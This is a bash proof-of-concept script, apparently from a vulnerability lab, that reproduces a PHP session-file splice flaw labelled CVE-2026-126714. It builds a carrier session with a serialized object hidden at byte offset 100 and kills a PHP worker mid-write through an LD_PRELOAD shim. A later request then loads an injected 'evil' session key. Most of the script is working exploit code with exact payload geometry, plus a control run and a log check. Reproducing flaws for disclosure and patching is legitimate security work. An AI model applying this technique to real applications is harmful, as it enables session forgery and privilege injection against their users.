#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) PRODUCER-side splice demo.
#
# Complement to php2shell-aftershell-splice-consumer.sh: there, the
# documented post-kill bytes were written by hand; here a REAL PHP session
# write is interrupted and must leave those bytes on disk itself.
#
# Path exercised (vendor advisory GHSA-fm2m-fjf5-v3cp "Impact": "can also
# arise when an application stores large user-controlled strings in a
# session"): an application session whose string content the attacker
# controls. Three CLI requests on one session dir:
#   req1 (carrier):    $_SESSION['data'] = 168-byte user string with the
#                      target record inert at byte offset 100 of the
#                      serialized file; $_SESSION['roles'] = ['admin'].
#                      Serialized C = 'data|s:168:"' + PAD1(88 A) + OBJ +
#                      PAD2(32 B) + '";' + ROLES  (OBJ starts at byte 100).
#   req2 (replacement): $_SESSION['data'] becomes 87 X's (serialized first
#                      record = EXACTLY 100 bytes: 'data|s:87:"<87X>";' —
#                      an 11-byte header for a 2-digit length; observed the
#                      hard way: an 86-X record is 99 bytes and the stray
#                      next byte shifts the promoted key to 'revil'),
#                      plus a 'pad' record so len(R) >= len(C) — Variant A
#                      ordering means NO pre-write truncate (mod_files.c
#                      truncates only when len(R) < st_size). The process
#                      runs under lab/php2shell/aftershell-kill.c
#                      (LD_PRELOAD): pwrite writes the first 100 bytes,
#                      then SIGKILL — the worker dies mid-session-write.
#                      File must be left as R[0:100] || C[100:].
#   req3 (consumer):   fresh worker, plain session_start() — the retained
#                      carrier tail promotes $_SESSION['evil'].
#   control:           identical req2 without the kill — session ends
#
# The kill is simulated at the syscall boundary (partial pwrite + SIGKILL);
# everything on the PHP side is the real code path.
#
# Usage: bash lab/repro/php2shell-aftershell-splice-producer.sh <php-cli-bin> [outdir]

set -u
PHP=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(basename "$(dirname "$(dirname "$(dirname "$1")")")" | sed 's/^php-//')
mkdir -p "$OUT"
LOG="$OUT/aftershell-producer-$LABEL.log"
: > "$LOG"

REPOROOT=$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")

SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
trap 'rm -rf "$D"' EXIT
SESS="$D/sess"; mkdir -p "$SESS"
SID="spliceprod"

PAD1=$(head -c 88 /dev/zero | tr '\0' 'A')
PAD2=$(head -c 32 /dev/zero | tr '\0' 'B')
XS=$(head -c 87 /dev/zero | tr '\0' 'X')
YS=$(head -c 500 /dev/zero | tr '\0' 'Y')
OBJ='evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
B64OBJ=$(printf %s "$OBJ" | base64 -w0)

run_php() { # $1...: php -r code   (env via LD_PRELOAD_/KILL_AT_ globals)
    LD_PRELOAD=${LP:-} AFTERSHELL_KILL_AT=${KA:-} "$PHP" \
        -d session.save_path="$SESS" -d session.serialize_handler=php \
        -d session.upload_progress.enabled=0 -n -r "$1" >> "$LOG" 2>&1
}

# ---- req1: carrier session (object bytes inert inside the user string)
LP="" KA=""
run_php 'session_id("'$SID'"); session_start();
$o = base64_decode("'$B64OBJ'");
$_SESSION["data"] = str_repeat("A",88) . $o . str_repeat("B",32);
$_SESSION["roles"] = ["admin"];'
echo "req1 rc=$?" >> "$LOG"
echo "file-after-req1: $(wc -c < "$SESS/sess_$SID") bytes" >> "$LOG"

# carrier sanity: OBJ must sit at byte offset 100 of the serialized file
if [ "$(tail -c +101 "$SESS/sess_$SID" | head -c 48)" = "$OBJ" ]; then
    echo "carrier geometry OK: OBJ at offset 100" >> "$LOG"
else
    echo "CARRIER GEOMETRY MISMATCH — inspect $SESS/sess_$SID" >> "$LOG"
    cat "$SESS/sess_$SID" >> "$LOG"
    echo "CARRIER GEOMETRY MISMATCH — see $LOG"; exit 1
fi

# ---- req2: replacement session, worker killed mid-write at byte 100
LP="$SO" KA=100
run_php 'session_id("'$SID'"); session_start();
$_SESSION["data"] = str_repeat("X",87);
$_SESSION["pad"] = str_repeat("Y",500);'
echo "req2 rc=$? (137 = SIGKILL expected)" >> "$LOG"
LP="" KA=""

# file state after the kill
FILESZ=$(wc -c < "$SESS/sess_$SID")
PREFIX=$(head -c 100 "$SESS/sess_$SID")
echo "file-after-kill: $FILESZ bytes" >> "$LOG"
echo "  prefix(100B): $PREFIX" >> "$LOG"
echo "  tail-from-101: $(tail -c +101 "$SESS/sess_$SID" | head -c 60)" >> "$LOG"

MIXOK=0
if [ "$FILESZ" -gt 100 ] \
   && [ "$(tail -c +101 "$SESS/sess_$SID" | head -c 48)" = "$OBJ" ]; then
    MIXOK=1
    echo "SPLICE STATE ON DISK: R[0:100] || C[100:] — retained tail present" >> "$LOG"
else
    echo "kill missed the acceptance point — file state is not the splice" >> "$LOG"
fi

# ---- req3: consumer — plain session_start on the interrupted file
run_php 'session_id("'$SID'"); session_start();
echo "EVIL="; var_dump($_SESSION["evil"] ?? null);
echo "DATALEN="; var_dump(isset($_SESSION["data"]) ? strlen($_SESSION["data"]) : null);
echo "KEYS="; var_dump(array_keys($_SESSION));'
echo "req3 rc=$?" >> "$LOG"

# ---- control: same replacement request WITHOUT the kill
LP="" KA=""
rm -f "$SESS"/sess_*
run_php 'session_id("'$SID'"); session_start();
$_SESSION["data"] = str_repeat("X",87);
$_SESSION["pad"] = str_repeat("Y",500);
echo "control-write-done";'
run_php 'session_id("'$SID'"); session_start();
echo "CTL_EVIL="; var_dump($_SESSION["evil"] ?? null);'
echo "control rc=$?" >> "$LOG"

echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG"; then
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG"
fi
grep -q '^EVIL=object(stdClass)' "$LOG" \
    && echo "   PRODUCER->CONSUMER: promoted stdClass observed" \
    || echo "   no promotion (see $LOG)"
[ "$MIXOK" = 1 ] && echo "   post-kill file state: R[0:100]||C[100:] on disk" \
                  || echo "   post-kill file state: NOT the splice (see $LOG)"
grep -q 'CTL_EVIL=object(stdClass)' "$LOG" \
    && echo "   CONTROL UNEXPECTED: object without kill — harness invalid" \
    || echo "   control (no kill): no object, as expected"
exit 0
